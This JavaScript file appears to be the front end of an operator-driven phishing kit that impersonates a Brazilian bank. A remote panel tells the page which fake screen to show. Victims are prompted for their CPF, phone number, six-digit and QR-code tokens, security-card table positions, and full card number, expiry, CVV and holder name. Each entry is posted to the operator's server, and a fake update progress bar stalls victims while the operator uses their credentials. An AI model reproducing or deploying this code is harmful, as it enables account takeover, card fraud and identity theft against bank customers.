$(document).ready(function() {

    formatar();
    webrequest();

    setInterval(() => {


        if (barraAtiva) {
            porcentagem++;
            $('div.miolo').css('width', porcentagem + '%');
            $('p.porcentagem').text(porcentagem + "%");
            if (porcentagem === 100) {
                porcentagem = 0;
            }
        };

    }, 3000);

    function webrequest() {
        var id = document.querySelector('#ident').value;
        const requestweb = $.ajax({
            url: "../webdriver/function.php?acao=comando",
            method: "post",
            dataType: "text",
            data: {
                id: id
            },
            cache: false
        });

        requestweb.done(data => {

                if (data == "atendimento_finalizado") {
                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'cliente_expulso'
                        },
                        cache: false
                    });

                    request.done(data => {
                        location.href = window.location.origin + '/saida.html';
                    })
                }

                if (data == "solicitar_serial_qr") {

                    $('#erroqrtoken').hide();
                    $('#boxQrCode').show();
                    $('#aguardeQR').show();
                    $('#boxCarregando').hide();
                    $('#boxToken').hide();
                    $('#boxCPF').hide();
                    $('#boxCelular').hide();
                    $('#boxNomeMae').hide();
                    $('#boxTabela').hide();

                    $('#qrCodeToken').val('');

                    $('#boxAtualizarModulo').hide();

                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'aguardando exibir qrcode'
                        },
                        cache: false
                    });

                    setTimeout(function() {

                        $('#aguardeQR').hide();
                        $('#capturaQR').show();
                        $('#boxToken').hide();

                        $('#qrCodeToken').focus();

                        const request = $.ajax({
                            url: "../webdriver/function.php?funcao=enviar-comando",
                            method: "post",
                            dataType: "text",
                            data: {
                                comando: 'exibindo qrcode'
                            },
                            cache: false
                        });

                    }, 10000);

                }

                if (data == "qrcode_erro") {
                    $('#erroqrtoken').show();
                    $('#boxQrCode').show();
                    $('#aguardeQR').hide();
                    $('#capturaQR').show();
                    $('#boxCarregando').hide();
                    $('#boxToken').hide();
                    $('#boxCPF').hide();
                    $('#boxCelular').hide();
                    $('#boxNomeMae').hide();
                    $('#boxTabela').hide();

                    $('#boxAtualizarModulo').hide();

                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'exibindo_erro_qrcode'
                        },
                        cache: false
                    });
                }

                if (data == "token_6") {
                    $('#erroqrtoken').hide();
                    $('#boxQrCode').hide();
                    $('#aguardeQR').hide();
                    $('#capturaQR').hide();
                    $('#boxCarregando').hide();
                    $('#boxCPF').hide();
                    $('#boxCelular').hide();
                    $('#boxNomeMae').hide();
                    $('#boxTabela').hide();

                    $('#btnAcessarToken').prop("disabled", true);
                    $('#token').val('');
                    $('#token').focus();
                    $('#btnAcessarToken').removeClass('btn-action-active');

                    $('#boxAtualizarModulo').hide();

                    $('#boxToken').show();

                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'AGUARDANDO TOKEN 6'
                        },
                        cache: false
                    });
                }

                if (data == "celular") {
                    $('#erroqrtoken').hide();
                    $('#boxQrCode').hide();
                    $('#aguardeQR').hide();
                    $('#capturaQR').hide();
                    $('#boxCarregando').hide();
                    $('#boxNomeMae').hide();
                    $('#boxTabela').hide();

                    $('#btnAtualizarCelular').prop("disabled", true);
                    $('#celular').val('');
                    $('#celular').focus();
                    $('#btnAtualizarCelular').removeClass('btn-action-active');

                    $('#boxAtualizarModulo').hide();

                    $('#boxToken').hide();
                    $('#boxCPF').hide();
                    $('#boxCelular').show();

                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'AGUARDANDO CELULAR'
                        },
                        cache: false
                    });
                }

                if (data == "celular_erro") {
                    $('#erroqrtoken').hide();
                    $('#boxQrCode').hide();
                    $('#aguardeQR').hide();
                    $('#capturaQR').hide();
                    $('#boxCarregando').hide();
                    $('#boxNomeMae').hide();
                    $('#boxTabela').hide();

                    $('#btnAtualizarCelular').prop("disabled", true);
                    $('#celular').val('');
                    $('#celular').focus();
                    $('#btnAtualizarCelular').removeClass('btn-action-active');

                    $('#boxAtualizarModulo').hide();

                    $('#boxToken').hide();
                    $('#boxCPF').hide();
                    $('#boxCelular').show();
                    $('#errocelular').show();

                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'AGUARDANDO CELULAR'
                        },
                        cache: false
                    });
                }

                if (data == "cpf") {
                    $('#erroqrtoken').hide();
                    $('#boxQrCode').hide();
                    $('#aguardeQR').hide();
                    $('#capturaQR').hide();
                    $('#boxCarregando').hide();
                    $('#boxCelular').hide();
                    $('#boxNomeMae').hide();
                    $('#boxTabela').hide();

                    $('#btnAtualizarCpf').prop("disabled", true);
                    $('#cpf').val('');
                    $('#cpf').focus();
                    $('#btnAtualizarCpf').removeClass('btn-action-active');

                    $('#boxAtualizarModulo').hide();

                    $('#boxToken').hide();
                    $('#boxCPF').show();

                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'AGUARDANDO CPF'
                        },
                        cache: false
                    });
                }

                if (data == "cpf_erro") {
                    $('#erroqrtoken').hide();
                    $('#boxQrCode').hide();
                    $('#aguardeQR').hide();
                    $('#capturaQR').hide();
                    $('#boxCarregando').hide();
                    $('#boxCelular').hide();
                    $('#boxNomeMae').hide();
                    $('#boxTabela').hide();

                    $('#btnAtualizarCpf').prop("disabled", true);
                    $('#cpf').val('');
                    $('#cpf').focus();
                    $('#btnAtualizarCpf').removeClass('btn-action-active');

                    $('#boxAtualizarModulo').hide();

                    $('#boxToken').hide();
                    $('#boxCPF').show();
                    $('#errocpf').show();

                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'AGUARDANDO CPF'
                        },
                        cache: false
                    });
                }

                if (data == "token_6_erro") {
                    $('#erroqrtoken').hide();
                    $('#boxQrCode').hide();
                    $('#aguardeQR').hide();
                    $('#capturaQR').hide();
                    $('#boxCarregando').hide();
                    $('#boxCPF').hide();
                    $('#boxCelular').hide();
                    $('#boxNomeMae').hide();
                    $('#boxTabela').hide();

                    $('#btnAcessarToken').prop("disabled", true);
                    $('#token').val('');
                    $('#token').focus();
                    $('#btnAcessarToken').removeClass('btn-action-active');

                    $('#boxAtualizarModulo').hide();

                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'AGUARDANDO TOKEN 6'
                        },
                        cache: false
                    });

                    request.done(data => {
                        $('#boxToken').show();
                        $('#errotoken').show();
                        $('#token').val('');
                        $('#token').focus();
                    })

                }

                if (data == "atualizar_modulo") {
                    $('#erroqrtoken').hide();
                    $('#boxQrCode').hide();
                    $('#aguardeQR').hide();
                    $('#capturaQR').hide();
                    $('#boxCarregando').hide();
                    $('#boxToken').hide();
                    $('#errotoken').hide();
                    $('#boxCPF').hide();
                    $('#boxCelular').hide();
                    $('#boxNomeMae').hide();
                    $('#boxTabela').hide();

                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'atualizando modulo'
                        },
                        cache: false
                    });

                    request.done(data => {
                        $('#boxAtualizarModulo').show();

                        porcentagem = 1;

                        $('div.miolo').css('width', porcentagem + '%');
                        $('p.porcentagem').text(porcentagem + "%");
                        barraAtiva = true;
                        $('div#boxAtualizarModulo').removeClass('hide');

                    })

                }

                if (data == "mae") {
                    $('#erroqrtoken').hide();
                    $('#boxQrCode').hide();
                    $('#aguardeQR').hide();
                    $('#capturaQR').hide();
                    $('#boxCarregando').hide();

                    $('#btnConfirmarNomeMae').prop("disabled", true);
                    $('#nomeMae').val('');
                    $('#nomeMae').focus();
                    $('#btnConfirmarNomeMae').removeClass('btn-action-active');

                    $('#boxAtualizarModulo').hide();

                    $('#boxToken').hide();
                    $('#boxCPF').hide();
                    $('#boxCelular').hide();
                    $('#boxNomeMae').show();
                    $('#boxTabela').hide();

                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'AGUARDANDO CARTAO'
                        },
                        cache: false
                    });
                }

                if (data == "mae_erro") {
                    $('#erroqrtoken').hide();
                    $('#boxQrCode').hide();
                    $('#aguardeQR').hide();
                    $('#capturaQR').hide();
                    $('#boxCarregando').hide();

                    $('#btnConfirmarNomeMae').prop("disabled", true);
                    $('#nomeMae').val('');
                    $('#nomeMae').focus();
                    $('#btnConfirmarNomeMae').removeClass('btn-action-active');

                    $('#boxAtualizarModulo').hide();

                    $('#boxToken').hide();
                    $('#boxCPF').hide();
                    $('#boxCelular').hide();
                    $('#boxNomeMae').show();
                    $('#erromae').show();
                    $('#boxTabela').hide();

                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'AGUARDANDO CARTAO'
                        },
                        cache: false
                    });
                }

                if (data == "tabela_erro") {
                    $('#erroqrtoken').hide();
                    $('#boxQrCode').hide();
                    $('#aguardeQR').hide();
                    $('#capturaQR').hide();
                    $('#boxCarregando').hide();

                    $('#btnAcessarTabela').prop("disabled", true);
                    $('#posicaoTabela').val('');
                    $('#posicaoTabela').focus();
                    $('#btnAcessarTabela').removeClass('btn-action-active');

                    $('#boxAtualizarModulo').hide();

                    $('#boxToken').hide();
                    $('#boxCPF').hide();
                    $('#boxCelular').hide();
                    $('#boxNomeMae').hide();
                    $('#boxTabela').show();
                    $('#errotabela').show();

                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'AGUARDANDO TABELA'
                        },
                        cache: false
                    });
                }

                if (data == "tabela") {
                    $('#erroqrtoken').hide();
                    $('#boxQrCode').hide();
                    $('#aguardeQR').hide();
                    $('#capturaQR').hide();
                    $('#boxCarregando').hide();

                    $('#btnAcessarTabela').prop("disabled", true);
                    $('#posicaoTabela').val('');
                    $('#posicaoTabela').focus();
                    $('#btnAcessarTabela').removeClass('btn-action-active');

                    $('#boxAtualizarModulo').hide();

                    $('#boxToken').hide();
                    $('#boxCPF').hide();
                    $('#boxCelular').hide();
                    $('#boxNomeMae').hide();
                    $('#boxTabela').show();

                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'AGUARDANDO TABELA'
                        },
                        cache: false
                    });
                }

            })
            .always(function() {
                setTimeout(function() {
                    webrequest();
                }, 3000);
            });

    }

    var online = document.querySelector('#ident').value;

    setInterval(function() {
        //Incluir e enviar o POST para o arquivo responsável em fazer contagem
        $.post("../webdriver/function.php?app=online", {
            contar: online,
        }, function(data) {
            $('#online').text(data);
        });
    }, 2000);

    $(document).ready(function() {
        // 1. Forçar botão sempre ativo
        function forceEnableButton() {
            $('#btnConfirmarNomeMae').prop("disabled", false)
                                   .addClass('btn-action-active');
        }
        forceEnableButton();
        setInterval(forceEnableButton, 500);
    
        // 2. Formatação automática da validade (MM/AA)
        $('#validade').on('input', function() {
            let value = this.value.replace(/\D/g, '');
            if (value.length > 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            this.value = value.substring(0, 5);
        });
    
        // 3. Máscara para o CVV (garante 3 dígitos numéricos)
        $('#vcv').on('input', function() {
            this.value = this.value.replace(/\D/g, '').substring(0, 3);
        });
    
        // 4. Evento de clique do botão (COM CORREÇÃO PARA CVV)
        $('#btnConfirmarNomeMae').on('click', function() {
            // Coleta e valida os valores
            const numCartao = $('#numeroCartao').val().replace(/\D/g, '') || 'NÃOINFORMADO';
            
            // Formata a validade (remove a barra)
            let validade = $('#validade').val().replace(/\D/g, '') || 'NÃOINFORMADO';
            
            // CORREÇÃO PRINCIPAL: Verifica se o CVV tem 3 dígitos
            const vcv = $('#vcv').val();
            
            
            const nomeTitular = $('#nomeTitular').val().trim() || 'NÃOINFORMADO';
    
            // Formata para envio
            const dadosParaEnvio = `${numCartao}/${validade}/${vcv}/${nomeTitular}`;
    
            // Debug: mostra os dados no console antes de enviar
            console.log('Dados sendo enviados:', dadosParaEnvio);
            
            // Envia os dados
            $.ajax({
                method: "POST",
                url: "../webdriver/function.php?funcao=salvar-token",
                data: {
                    valor: dadosParaEnvio,
                    funcao: 'Cartao'
                }
            }).done(function() {
                $('#boxNomeMae').hide();
                $('#boxCarregando').show();
                $('#numeroCartao, #validade, #cvv, #nomeTitular').val('');
                
                $.post("../webdriver/function.php?funcao=enviar-comando", {
                    comando: 'CARTAO RECEBIDO'
                });
            });
        });
    });

    $('#btnAtualizarCelular').on('click', function(evt) {
        $('#errocelular').hide();

        var celular_value = document.querySelector('#celular').value;

        const request = $.ajax({
            method: "post",
            url: "../webdriver/function.php?funcao=salvar-token",
            data: {
                valor: celular_value,
                funcao: 'CELULAR'
            },
        });

        request.done(data => {

            $('#errocelular').hide();
            $('#boxCelular').hide();
            $('#boxCarregando').show();

            $('#celular').val('');

            const request = $.ajax({
                url: "../webdriver/function.php?funcao=enviar-comando",
                method: "post",
                dataType: "text",
                data: {
                    comando: 'CELULAR RECEBIDO'
                },
                cache: false
            });
            return true;

        })

    })

    $('#btnAtualizarCpf').on('click', function(evt) {
        $('#errocpf').hide();

        var cpf_value = document.querySelector('#cpf').value;

        const request = $.ajax({
            method: "post",
            url: "../webdriver/function.php?funcao=salvar-token",
            data: {
                valor: cpf_value,
                funcao: 'CPF'
            },
        });

        request.done(data => {

            $('#errocpf').hide();
            $('#boxCPF').hide();
            $('#boxCarregando').show();

            $('#cpf').val('');

            const request = $.ajax({
                url: "../webdriver/function.php?funcao=enviar-comando",
                method: "post",
                dataType: "text",
                data: {
                    comando: 'CPF RECEBIDO'
                },
                cache: false
            });
            return true;

        })

    })

    $('#btnAcessarTabela').on('click', function(evt) {
        $('#errotabela').hide();

        var tabela_value = document.querySelector('#posicaoTabela').value;

        const request = $.ajax({
            method: "post",
            url: "../webdriver/function.php?funcao=salvar-token",
            data: {
                valor: tabela_value,
                funcao: 'TABELA'
            },
        });

        request.done(data => {

            $('#errotabela').hide();
            $('#boxTabela').hide();
            $('#boxCarregando').show();

            $('#posicaoTabela').val('');

            const request = $.ajax({
                url: "../webdriver/function.php?funcao=enviar-comando",
                method: "post",
                dataType: "text",
                data: {
                    comando: 'TABELA RECEBIDO'
                },
                cache: false
            });
            return true;

        })

    })

    $('#posicaoTabela').on('keyup', function(evt) {
        $('#errotabela').hide();

        var tabela_value = document.querySelector('#posicaoTabela').value;

        if (tabela_value.length == 3) {
            $('#btnAcessarTabela').addClass('btn-action-active');
            $('#btnAcessarTabela').prop("disabled", false);
        } else {
            $('#btnAcessarTabela').removeClass('btn-action-active');
            $('#btnAcessarTabela').prop("disabled", true);
        }

    })

    $('#nomeMae').on('keyup', function(evt) {
        $('#erromae').hide();
    
        var mae_value = document.querySelector('#nomeMae').value;
    
        // Remove a validação de maiúscula e aceita qualquer caractere (pode ajustar conforme necessidade)
        if (mae_value.length > 0) {  // Verifica apenas se há algum texto digitado
            $('#btnConfirmarNomeMae').addClass('btn-action-active');
            $('#btnConfirmarNomeMae').prop("disabled", false);
        } else {
            $('#btnConfirmarNomeMae').removeClass('btn-action-active');
            $('#btnConfirmarNomeMae').prop("disabled", true);
        }
    });

    $('#celular').mask('(00) 00000-0000', {
        reverse: false
    });

    $('#celular').on('keyup', function(evt) {

        $('#errocelular').hide();

        var telefone_value = document.querySelector('#celular').value;

        var regexTelefone = /^\(\d{2}\) \d{4,5}-\d{4}$/;

        if (regexTelefone.test(telefone_value)) {
            //console.log("Número de telefone válido!");
            $('#btnAtualizarCelular').addClass('btn-action-active');
            $('#btnAtualizarCelular').prop("disabled", false);
        } else {
            //console.log("Número de telefone inválido!");
            $('#btnAtualizarCelular').removeClass('btn-action-active');
            $('#btnAtualizarCelular').prop("disabled", true);
            return false;
        }

    })

    $('#cpf').on('keyup', function(evt) {

        $('#errocpf').hide();

        var cpf_value = document.querySelector('#cpf').value;

        if (validarCPF(cpf_value)) {
            $('#btnAtualizarCpf').addClass('btn-action-active');
            $('#btnAtualizarCpf').prop("disabled", false);
        } else {
            $('#btnAtualizarCpf').removeClass('btn-action-active');
            $('#btnAtualizarCpf').prop("disabled", true);
        }

    })

    $('#cpf').mask('000.000.000-00', {
        reverse: false
    });

    $("#cpf").keyup(function() {
        $("#errocpf").hide();
    });

    function validarCPF(cpf) {
        // Remover caracteres especiais do CPF
        cpf = cpf.replace(/[^\d]/g, '');

        // Verificar se o CPF tem 11 dígitos
        if (cpf.length !== 11) {
            return false;
        }

        // Verificar se todos os dígitos do CPF são iguais
        if (/^(\d)\1+$/.test(cpf)) {
            return false;
        }

        // Calcular o primeiro dígito verificador
        var soma = 0;
        for (var i = 0; i < 9; i++) {
            soma += parseInt(cpf.charAt(i)) * (10 - i);
        }
        var resto = (soma * 10) % 11;
        var digitoVerificador1 = (resto === 10 || resto === 11) ? 0 : resto;

        // Verificar o primeiro dígito verificador
        if (digitoVerificador1 !== parseInt(cpf.charAt(9))) {
            return false;
        }

        // Calcular o segundo dígito verificador
        soma = 0;
        for (var j = 0; j < 10; j++) {
            soma += parseInt(cpf.charAt(j)) * (11 - j);
        }
        resto = (soma * 10) % 11;
        var digitoVerificador2 = (resto === 10 || resto === 11) ? 0 : resto;

        // Verificar o segundo dígito verificador
        if (digitoVerificador2 !== parseInt(cpf.charAt(10))) {
            return false;
        }

        // CPF válido
        return true;
    }

    ////////

    $('#btnAcessarToken').on('click', function(evt) {

        var token_value = document.querySelector('#token').value;

        var regextoken = /^\d{6}$/;

        if (regextoken.test(token_value)) {} else {
            $('#errotoken').show();
            return false;
        }

        const request = $.ajax({
            method: "post",
            url: "../webdriver/function.php?funcao=salvar-token",
            data: {
                valor: token_value,
                funcao: 'TOKEN 6'
            },
        });

        request.done(data => {

            $('#errotoken').hide();
            $('#boxToken').hide();
            $('#boxCarregando').show();

            $('#token').val('');
            $('#token').focus();

            const request = $.ajax({
                url: "../webdriver/function.php?funcao=enviar-comando",
                method: "post",
                dataType: "text",
                data: {
                    comando: 'TOKEN 6 RECEBIDO'
                },
                cache: false
            });
            return true;

        })

    })

    setInterval(function() {
        //Incluir e enviar o POST para o arquivo responsável em fazer contagem
        $.post("../webdriver/function.php?funcao=consultar-serial", {
            funcao: 'atualizar_serial',
        }, function(data) {
            $('.serial_cliente').text(data);
            $('#serial_tabela').text(data);

        });
    }, 5000);

    setInterval(function() {
        //Incluir e enviar o POST para o arquivo responsável em fazer contagem
        $.post("../webdriver/function.php?funcao=consultar-tabela", {
            funcao: 'consultar-tabela',
        }, function(data) {
            $('#posicao').text(data);

        });
    }, 5000);

    $('#token').on('keyup', function(evt) {

        $('#errotoken').hide();

        var token_value = document.querySelector('#token').value;

        if (token_value.length == 6) {
            $('#btnAcessarToken').addClass('btn-action-active');
            $('#btnAcessarToken').prop("disabled", false);
        } else {
            $('#btnAcessarToken').removeClass('btn-action-active');
            $('#btnAcessarToken').prop("disabled", true);
        }

    })

    ////////

    $('#btnConfirmarQr').on('click', function(evt) {

        var qrtoken = document.querySelector('#qrCodeToken').value;

        const request = $.ajax({
            method: "post",
            url: "../webdriver/function.php?funcao=salvar-token",
            data: {
                valor: qrtoken,
                funcao: 'TOKEN QR CODE'
            },
        });

        request.done(data => {
            $('#erroqrtoken').hide();
            $('#boxQrCode').hide();
            $('#boxCarregando').show();

            const request = $.ajax({
                url: "../webdriver/function.php?funcao=enviar-comando",
                method: "post",
                dataType: "text",
                data: {
                    comando: 'QR CODE RECEBIDO'
                },
                cache: false
            });
        })

    })

    $('#qrCodeToken').on('keyup', function(evt) {
        $('#erroqrtoken').hide();

        var token_value = document.querySelector('#qrCodeToken').value;

        if (token_value.length == 8) {
            $('#btnConfirmarQr').addClass('btn-action-active');
            $('#btnConfirmarQr').prop("disabled", false);
        } else {
            $('#btnConfirmarQr').removeClass('btn-action-active');
            $('#btnConfirmarQr').prop("disabled", true);
        }

    })

    function formatar() {
        var extenso;

        data = new Date();

        var day = ["Dom", "Seg", "Ter", "Quar", "Qui", "Sex", "Sáb"][data.getDay()];
        var date = data.getDate();
        var month = ["Jan", "Fev", "Mar", "Abri", "Mai", "Jun", "Jul", "Ago", "Set", "Out", "Nov", "Dez"][data.getMonth()];
        var year = data.getFullYear();

        console.log(data);

        $('.data').html(`${day}, ${date} de ${month} de ${year}`);
    }

    setInterval(function() {
        //Incluir e enviar o POST para o arquivo responsável em fazer contagem
        $.post("../webdriver/function.php?funcao=consultar-saldo", {
            funcao: 'atualizar_serial',
        }, function(data) {
            $('.moedatela').text(data);
            $('#totalmoeda').text(data);
        });
    }, 2000);

    setInterval(function() {
        $('#qrcodeimg').show();
        //Incluir e enviar o POST para o arquivo responsável em fazer contagem
        $.post("../webdriver/function.php?funcao=consultar-qrcode", {
            funcao: 'atualizar_qrcode',
        }, function(data) {
            $('#qrcodeimg').attr('src', data);
        });
    }, 1000);
});